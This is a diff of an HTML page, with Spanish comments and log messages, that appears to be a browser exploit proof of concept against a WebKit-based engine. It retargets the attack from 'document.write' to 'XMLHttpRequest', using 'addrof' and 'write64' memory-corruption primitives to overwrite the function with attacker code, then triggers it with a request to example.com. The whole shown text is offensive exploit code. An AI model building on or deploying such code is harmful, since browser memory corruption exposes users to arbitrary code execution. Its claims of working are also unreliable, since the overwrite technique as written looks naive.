@@ -2,14 +2,14 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Corromper Función Interna</title>
+  <title>Corromper XMLHttpRequest</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; padding: 2em; }
     h1 { color: cyan; }
   </style>
 </head>
 <body>
-  <h1>Corromper Función Interna con Proxy</h1>
+  <h1>Corromper XMLHttpRequest con Proxy</h1>
   <pre id="debug">Ejecutando ataque...</pre>
 
   <script>
@@ -52,21 +52,23 @@
       };
     }
 
-    // Corrupting internal WebKit function: document.write
-    log("Intentando corromper la función 'document.write'...");
-    const writeAddress = addrof(document.write);
-    log(`Dirección de 'document.write': ${writeAddress}`);
+    // Corrupting XMLHttpRequest function
+    log("Intentando corromper la función 'XMLHttpRequest'...");
+    const xhrAddress = addrof(XMLHttpRequest);
+    log(`Dirección de 'XMLHttpRequest': ${xhrAddress}`);
 
     const fakeCode = function() {
       log("Código arbitrario ejecutado: ¡Hola desde el exploit!");
     };
 
-    // Sobrescribimos 'document.write' con nuestra función
-    write64(writeAddress, addrof(fakeCode));
-    log("Función 'document.write' corrompida.");
+    // Sobrescribimos 'XMLHttpRequest' con nuestra función
+    write64(xhrAddress, addrof(fakeCode));
+    log("Función 'XMLHttpRequest' corrompida.");
 
-    // Ejecutamos document.write para ver si se ejecuta nuestro código
-    document.write("Esto debería ejecutar código arbitrario: ");
+    // Intentamos realizar una petición HTTP que ahora debería ejecutar código arbitrario
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://example.com');
+    xhr.send();
   </script>
 </body>
 </html>
